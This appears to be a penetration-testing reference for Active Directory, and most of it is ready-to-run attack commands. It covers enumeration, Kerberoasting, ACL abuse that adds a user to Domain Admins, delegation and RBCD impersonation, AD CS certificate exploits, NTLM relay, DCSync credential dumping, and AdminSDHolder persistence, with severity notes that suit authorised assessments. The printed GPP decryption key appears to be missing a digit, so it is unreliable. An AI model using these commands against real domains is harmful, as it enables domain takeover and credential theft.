# AD Attack Pattern Reference

Command and pattern reference for every attack primitive used across `ad-recon`'s phases. Grouped by category with tool syntax, expected output, and severity guidance. Pair with `attck-ad-mapping.md` for ATT&CK tagging.

---

## Enumeration primitives

| Goal | Command | Notes |
|---|---|---|
| Domain name from SMB | `nxc smb $DC_IP` | Works unauthenticated |
| Anonymous LDAP bind | `ldapsearch -x -H ldap://$DC_IP -s base namingcontexts` | No creds needed if allowed |
| Null-session share list | `nxc smb $DC_IP -u '' -p '' --shares` | Flag if returns non-default shares |
| RID cycling | `rpcclient -U "" -N $DC_IP -c "lookupsids S-1-5-21-<sid>-<rid>"` | Requires null session |
| Kerberos user enum | `kerbrute userenum -d $DOMAIN --dc $DC_IP wordlist.txt` | Pre-auth only, low log footprint |
| Password policy | `nxc smb $DC_IP -u '' -p '' --pass-pol` | Always check before spraying |
| Full LDAP dump | `nxc ldap $DC_IP -u $USER -p $PASS --bloodhound -c All` | Requires valid creds |
| Trust enumeration | `nxc ldap $DC_IP -u $USER -p $PASS -M enum_trusts` | Look for transitive + SID history |

---

## Kerberos attack signatures

| Attack | Tool | Hash format | Hashcat mode |
|---|---|---|---|
| AS-REP Roasting | `impacket-GetNPUsers` | `$krb5asrep$23$user@REALM:...` | 18200 |
| Kerberoasting | `impacket-GetUserSPNs` | `$krb5tgs$23$*user$REALM$spn*$...` | 13100 |
| Timeroasting | `timeroast.py` | `$sntp-ms$...` | 31300 |
| Kerberoasting (AES) | `impacket-GetUserSPNs` (AES-enabled account) | `$krb5tgs$18$...` | 19700 |

**Severity guidance:**
- Cracked account is Domain Admin / Enterprise Admin / has DCSync rights → **Critical**
- Cracked account is any other privileged group → **High**
- Cracked account is a standard user/service with no lateral value → **Medium**
- Roastable but not cracked in reasonable time → still **Medium** (report as exposure risk, weak password unproven)

---

## ACL abuse decision table

Given a discovered ACE (from BloodHound or manual `dacledit`/`ldapsearch` inspection), pick the abuse primitive:

| ACE held | On object type | Abuse command |
|---|---|---|
| `GenericAll` | User | `impacket-changepasswd $DOMAIN/$USER:$PASS@$DC_IP -newpass 'P@ss!' -altuser TARGET -altpass $PASS` |
| `GenericAll` | Group | LDAP: `python3 -c "from ldap3 import *; s=Server('$DC_IP'); c=Connection(s, user='$DOMAIN\\$USER', password='$PASS', authentication=NTLM, auto_bind=True); c.modify('CN=GROUP,CN=Users,DC=...', {'member': [(MODIFY_ADD, ['CN=TARGET,OU=...,DC=...'])]})"`  OR  `net rpc group addmem "GROUP" "$USER" -U "$DOMAIN/$USER%$PASS" -S $DC_IP` (requires RPC). LDAP is faster. |
| `GenericAll` | Computer | Shadow credentials or RBCD (see below) |
| `ForceChangePassword` | User | Same as GenericAll password reset: no old password needed |
| `WriteDacl` | Any | Grant self `GenericAll` first via `dacledit.py`, then abuse as above |
| `WriteOwner` | Any | Take ownership via `owneredit.py`, then `WriteDacl`, then `GenericAll` |
| `AddMember` | Group | `net rpc group addmem` directly |
| `GenericWrite` | Computer | Set `msDS-AllowedToActOnBehalfOfOtherIdentity` for RBCD |
| `GenericWrite` | User | Set an SPN for targeted Kerberoasting, or shadow credentials |

---

## GenericAll on Protected Groups (Domain Admins, Enterprise Admins, Administrators)

**Important:** Protected groups (those with `adminCount=1`) have their ACLs reset by SDProp every 60 minutes to match `CN=AdminSDHolder,CN=System,DC=...`. Any custom ACE placed directly on a protected group will be erased on the next propagation cycle.

**Exploitation:** If you discover `GenericAll` on `Domain Admins` (or other protected group):
1. **Act immediately** - you have ~60 minutes before SDProp wipes the ACE
2. Use LDAP to add yourself to the group (faster than RPC):
```python
from ldap3 import Server, Connection, NTLM, MODIFY_ADD
s = Server("DC_IP")
c = Connection(s, user="DOMAIN\\YOUR_USER", password="PASS", authentication=NTLM, auto_bind=True)
c.modify("CN=Domain Admins,CN=Users,DC=...,DC=...", {'member': [(MODIFY_ADD, ["CN=YOUR_USER,OU=...,DC=...,DC=..."])]})
```
3. **Verify immediately** via remote LDAP (not local AD: provider, which may cache)
4. Once in the group, DCSync the entire NTDS
5. For **persistence** (if you need the ACE to last beyond SDProp), grant the ACE on `AdminSDHolder` itself: SDProp will propagate it down instead of erasing it

**Detection gap:** Remote ACL inspection tools (impacket's `dacledit.py`, PowerView.py) may miss `GenericAll` ACEs on protected objects due to LDAP caching or filtering behavior. Always verify critical findings with a direct AD: provider read on the DC itself if possible. Cross-check with PowerShell's `Get-Acl "AD:\..."` on the DC to confirm.

```bash
# dacledit: grant GenericAll via WriteDacl
dacledit.py -action write -rights FullControl -principal $USER -target TARGET_OBJECT "$DOMAIN/$USER:$PASS"

# owneredit: take ownership via WriteOwner
owneredit.py -action write -owner $USER -target TARGET_OBJECT "$DOMAIN/$USER:$PASS"
```

---

## Delegation abuse patterns

### Unconstrained delegation chain
1. Identify computer with `TRUSTED_FOR_DELEGATION` (userAccountControl bit `0x80000` / `524288`).
2. Requires admin on that host to extract cached TGTs (`mimikatz sekurlsa::tickets` or Impacket equivalent).
3. Coerce a high-value account (DC machine account) to authenticate to it via PetitPotam/PrinterBug/DFSCoerce.
4. Extract the DC's TGT, use for DCSync.

### Constrained delegation (S4U2Self/S4U2Proxy)
```bash
impacket-getST -spn cifs/target.$DOMAIN -impersonate Administrator "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass "$DOMAIN/Administrator@target.$DOMAIN"
```

### Resource-Based Constrained Delegation (RBCD)
Requires `GenericWrite` on the target computer object (or ability to create a computer account, default quota 10 per user via `MachineAccountQuota`):
```bash
# Create attacker-controlled computer if no existing one is usable
impacket-addcomputer "$DOMAIN/$USER:$PASS" -computer-name 'ATTACKERPC$' -computer-pass 'Passw0rd!'

# Configure RBCD
impacket-rbcd -delegate-from 'ATTACKERPC$' -delegate-to 'TARGETCOMPUTER$' -action write "$DOMAIN/$USER:$PASS"

# Abuse: impersonate any user (e.g. Administrator) to TARGETCOMPUTER
impacket-getST -spn cifs/targetcomputer.$DOMAIN -impersonate Administrator "$DOMAIN/ATTACKERPC\$:Passw0rd!" -dc-ip $DC_IP
```

---

## AD CS (ESC1-ESC8) quick reference

| Class | Check | Exploit command |
|---|---|---|
| ESC1 | `certipy find -vulnerable` flags "ESC1": enrollee-supplied SAN + client auth EKU + low-priv enroll rights | `certipy req -u $USER@$DOMAIN -p $PASS -ca CA-NAME -template TEMPLATE -upn administrator@$DOMAIN` |
| ESC2 | Template EKU is "Any Purpose" or empty | Same as ESC1, cert usable for any auth |
| ESC3 | Template has "Certificate Request Agent" EKU misassigned | Enroll agent cert, then request on-behalf-of target |
| ESC4 | Weak ACL (`GenericAll`/`WriteProperty`) on template object | `certipy template -write-default-configuration` to make ESC1-vulnerable, then exploit |
| ESC6 | CA-level `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set | Same as ESC1 on any template accepting enrollment |
| ESC7 | Weak ACL on CA object itself (`Manage CA`/`Manage Certificates`) | `certipy ca -add-officer` then issue arbitrary cert |
| ESC8 | HTTP(S) web enrollment enabled without Extended Protection for Authentication | NTLM relay (`ntlmrelayx.py -t http://ca/certsrv/certfnsh.asp --adcs`) |
| ESC9/ESC10 | `szOID_NTDS_CA_SECURITY_EXT` disabled / weak cert mapping | Certificate-based UPN spoofing when strong mapping is not enforced |

```bash
# Authenticate using an issued certificate
certipy-ad auth -pfx administrator.pfx -dc-ip $DC_IP
```

---

## Credential harvesting patterns

| Source | Command | What it recovers |
|---|---|---|
| SAM/LSA (local admin) | `impacket-secretsdump $DOMAIN/$USER:$PASS@$TARGET` | Local hashes, cached domain creds |
| NTDS.dit (DA / DCSync rights) | `impacket-secretsdump $DOMAIN/$USER:$PASS@$DC_IP -just-dc` | Every domain account hash |
| GPP cpassword | `grep -ril cpassword SYSVOL_dump/` then decrypt with public AES key | Legacy GPO-deployed passwords |
| LAPS | `nxc ldap $DC_IP -u $USER -p $PASS -M laps` | Local admin passwords, if readable |
| Browser/registry (post-exploitation) | `secretsdump.py -sam -security` on live host | Locally stored creds |

Known GPP AES decryption key (public, from Microsoft's MSDN documentation). Flag any cpassword found: it is trivially reversible.
```
4e9906e8fcb66cc9faf49310620ffee8f496e806cc57990209b09a433b66c1b
```

---

## Persistence detection patterns

```bash
# AdminSDHolder non-default ACEs
ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
  -b "CN=AdminSDHolder,CN=System,DC=..." "(objectClass=*)" nTSecurityDescriptor

# DSRM logon behavior (registry, requires host access)
reg query "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior

# SID History outside migration window
nxc ldap $DC_IP -u $USER -p $PASS -M sidhistory

# krbtgt password last set (golden ticket exposure window)
nxc ldap $DC_IP -u $USER -p $PASS -M get-desc-users --filter "krbtgt"
```

Severity is Critical for any of the above found active in a production domain with no documented, time-bound justification (e.g. an in-progress migration for SID History).
